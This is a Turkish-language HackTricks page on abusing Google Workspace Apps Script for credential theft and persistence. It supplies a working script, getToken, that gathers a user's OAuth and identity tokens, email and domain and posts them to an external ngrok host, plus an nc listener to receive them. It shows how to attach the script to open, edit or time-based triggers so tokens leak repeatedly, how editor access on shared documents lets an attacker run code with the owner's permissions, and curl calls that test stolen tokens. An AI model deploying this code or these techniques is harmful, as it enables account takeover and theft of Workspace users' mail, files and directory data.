# GWS - App Scripts

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## App Scripts

App Scripts, **düzenleyici iznine sahip bir kullanıcının bağlantılı olduğu belgeye eriştiğinde ve OAuth isteğini kabul ettikten sonra tetiklenecek olan kodlardır**.\
Ayrıca, App Script'in sahibi tarafından belirli bir süre boyunca **düzenli olarak çalıştırılması** da ayarlanabilir (Kalıcılık).

### App Script Oluşturma

App Script oluşturmanın birkaç yolu vardır, ancak en yaygın olanları **herhangi bir türdeki bir Google Belgesi**nden ve **bağımsız bir proje** olarak oluşturulmasıdır:

<details>

<summary>Google Docs, Sheets veya Slides'dan bağlı bir proje oluşturma</summary>

1. Bir Docs belgesi, bir Sheets elektronik tablosu veya bir Slides sunusu açın.
2. **Uzantılar** > **Google Apps Script**'i tıklayın.
3. Betik düzenleyicide, **İsimsiz proje**'yi tıklayın.
4. Projeye bir ad verin ve **Yeniden Adlandır**'ı tıklayın.

</details>

<details>

<summary>Bağımsız bir proje oluşturma</summary>

Apps Script'ten bağımsız bir proje oluşturmak için:

1. [`script.google.com`](https://script.google.com/) adresine gidin.
2. **Yeni Proje Ekle**'yi tıklayın.
3. Betik düzenleyicide, **İsimsiz proje**'yi tıklayın.
4. Projeye bir ad verin ve **Yeniden Adlandır**'ı tıklayın.

</details>

<details>

<summary>Google Drive'dan bağımsız bir proje oluşturma</summary>

1. [Google Drive](https://drive.google.com/) adresini açın.
2. **Yeni** > **Daha Fazla** > **Google Apps Script**'i tıklayın.

</details>

<details>

<summary>Google Forms'dan bağlı bir proje oluşturma</summary>

1. Google Forms'ta bir form açın.
2. Daha Fazla more\_vert > **Betik Düzenleyici**'yi tıklayın.
3. Betik düzenleyicide, **İsimsiz proje**'yi tıklayın.
4. Projeye bir ad verin ve **Yeniden Adlandır**'ı tıklayın.

</details>

<details>

<summary>clasp komut satırı aracını kullanarak bağımsız bir proje oluşturma</summary>

`clasp`, terminalden Apps Script projeleri oluşturmanıza, çekmenize/itmeklemenize ve dağıtmanıza olanak sağlayan bir komut satırı aracıdır.

Daha fazla ayrıntı için [Command Line Interface using `clasp` guide](https://developers.google.com/apps-script/guides/clasp) sayfasına bakın.

</details>

## App Script Senaryosu <a href="#create-using-clasp" id="create-using-clasp"></a>

### App Script ile Google Sheet Oluşturma

Bir App Script oluşturarak başlayın, bu senaryo için önerim bir Google Sheet oluşturmanız ve **`Uzantılar > App Scripts`**'e gitmenizdir, bu size **sayfaya bağlı yeni bir App Script** açacaktır.

### Token Sızdırma

OAuth token'ına erişim sağlamak için **`Hizmetler +`'e tıklayın ve şu gibi kapsamlar ekleyin**:

* **AdminDirectory**: Dizin kullanıcılarına ve gruplarına erişim (kullanıcının yeterli izinlere sahip olması durumunda)
* **Gmail**: Gmail verilerine erişim için
* **Drive**: Drive verilerine erişim için
* **Google Sheets API**: Tetikleyiciyle çalışması için

**Gerekli kapsamları** kendiniz değiştirmek için proje ayarlarına gidip **"appsscript.json" manifest dosyasını editörde göster** seçeneğini etkinleştirebilirsiniz.

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

İsteği yakalamak için sadece şunu çalıştırabilirsiniz:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
App Script'i çalıştırmak için istenen izinler:

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Harici bir istek yapıldığında, OAuth istemi aynı zamanda **harici uç noktalara erişim izni** isteyecektir.
{% endhint %}

### Tetikleyici Oluşturma

App okunduktan sonra, bir tetikleyici oluşturmak için **⏰ Tetikleyiciler** üzerine tıklayın. **Fonksiyon** olarak **`getToken`**'ı seçin, dağıtımda **`Head`**'i çalıştırın, olay kaynağı olarak **`From spreadsheet`**'i ve olay türünü **`On open`** veya **`On edit`** (ihtiyaçlarınıza göre) seçin ve kaydedin.

Bir şeyleri hata ayıklamak isterseniz, **App Script'in çalışmalarını Yürütme sekmesinde** kontrol edebilirsiniz.

### Paylaşım

App Script'i **tetiklemek** için kurbanın **Düzenleyici Erişimi** ile bağlantı kurması gerekmektedir.

Özetlemek gerekirse, oluşturan ve davet edilen kullanıcı **aynı kuruluştansa**, **OAuth** **jetonu** dosyaya erişen **kullanıcıya ait olacaktır**.\
Eğer **farklı kuruluşlardansa**, **jeton** her zaman **tetikleyiciyi oluşturanın** olacaktır ve yalnızca tetikleyici oluşturulduğunda verilen **OAuth izinleriyle sınırlı olacaktır**.

{% hint style="success" %}
**App Script'i çalıştırmak için kullanılan jeton**, dosya diğer kullanıcılar tarafından Düzenleyici olarak açılsa bile, tetikleyiciyi oluşturanın jetonu olacaktır.
{% endhint %}

### Paylaşılan Belgeleri Kötüye Kullanma

{% hint style="danger" %}
Eğer biri size App Script'lerle birlikte bir tetikleyici kullanarak bir belge paylaştıysa (sabit bir dağıtım değilse), App Script kodunu değiştirebilir (örneğin, jeton çalma fonksiyonlarını ekleyebilir), buna erişebilir ve **App Script, belgeyi size paylaşan kullanıcının izinleriyle çalıştırılacaktır**! (unutmayın ki, sahibin OAuth jetonu, tetikleyici oluşturulduğunda verilen erişim kapsamlarına sahip olacaktır).

Birisi betiği değiştirdiğinde, betiği oluşturan kişiye bir **bildirim gönderilecektir** (Uyarıyı önlemek için gmail izinlerini kullanarak bir filtre oluşturmak nasıl olurdu?)
{% endhint %}

{% hint style="success" %}
Bir **saldırgan App Script'in kapsamlarını değiştirirse**, güncellemeler belgeye bir **yeni tetikleyici** oluşturulana kadar **uygulanmayacaktır**. Bu nedenle, bir saldırgan, oluşturduğu tetikleyicide belirlediği kapsamlardan daha fazla kapsama sahip sahibin oluşturucu jetonunu çalamayacaktır.
{% endhint %}

### Paylaşmak Yerine Kopyalama

Bir belgeyi paylaşmak için bir bağlantı oluşturduğunuzda, şuna benzer bir bağlantı oluşturulur: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Eğer sonundaki **"/edit"**'i **"/copy"** ile değiştirirseniz, google size belgenin bir **kopyasını oluşturup oluşturmak isteyip istemediğinizi soracaktır**:

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

Kullanıcı bunu kopyalarsa ve erişirse, **belgenin içeriği ve App Script'ler kopyalanır**, ancak **tetikleyiciler kopyalanmaz**, bu nedenle **hiçbir şey çalıştırılmaz**.

### Web Uygulaması Olarak Paylaşma

App Script'i bir Web uygulaması olarak da paylaşmanız mümkündür (App Script'in Düzenleyici'sinde bir Web uygulaması olarak dağıtın), ancak aşağıdaki gibi bir uyarı görünecektir:

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

Ardından, gerekli izinleri isteyen **tipik OAuth istemi** gelir.

### Test Etme

Toplanan bir jetonu e-postaları listelemek için test edebilirsiniz:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Kullanıcının takvimini listele:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script Olarak Kalıcılık

Kalıcılık için bir seçenek, **bir belge oluşturmak ve getToken** işlevi için bir tetikleyici eklemek ve belgeyi saldırganla paylaşmak olabilir, böylece saldırgan her dosyayı açtığında **kurbanın belirteci sızdırılır**.

Ayrıca, bir App Script oluşturup belirli bir süre (örneğin her dakika, saat, gün...) tetiklemesini yapabilirsiniz. **Kimlik bilgilerini veya bir kurbanın oturumunu ele geçiren bir saldırgan, bir App Script zaman tetikleyicisi ayarlayabilir ve her gün çok ayrıcalıklı bir OAuth belirteci sızdırabilir**:

Sadece bir App Script oluşturun, Tetikleyicilere gidin, Tetikleyici Ekle'yi tıklayın ve olay kaynağı olarak Zaman tabanlı seçin ve size en uygun seçenekleri seçin:

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Bu, bununla ilgili bir güvenlik uyarısı e-postası ve bir mobil uyarı mesajı oluşturacaktır.
{% endhint %}



### Paylaşılan Belge Doğrulanmamış İptal Geçişi

Dahası, biri size **düzenleyici erişimiyle** bir belge **paylaştıysa**, belge içinde **App Script'ler oluşturabilirsiniz** ve belgenin **SAHİBİ (oluşturan) App Script'in sahibi olacaktır**.

{% hint style="warning" %}
Bu, belgenin **oluşturucusunun, düzenleyici erişimi olan herhangi bir App Script'in oluşturucusu olarak görüneceği anlamına gelir.

Bu ayrıca, belgenin oluşturucusunun Workspace ortamı tarafından **App Script'e güvenildiği anlamına gelir**.
{% endhint %}

{% hint style="danger" %}
Bu ayrıca, eğer bir **App Script zaten varsa** ve insanlar **erişim vermişse**, belgedeki **Düzenleyici** iznine sahip herhangi bir kişi onu **değiştirebilir ve bu erişimi kötüye kullanabilir**.\
Bunu kötüye kullanmak için ayrıca insanların App Script'i tetiklemeleri gerekmektedir. Ve bir ipucu olarak, betiği bir web uygulaması olarak **yayınlamak**. App Script'e zaten erişim veren **kişiler**, web sayfasına eriştiğinde App Script'i **tetikleyecektir** (bu, `<img>` etiketlerini kullanarak da çalışır).
{% endhint %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **tanıtmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**'u** takip edin.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>
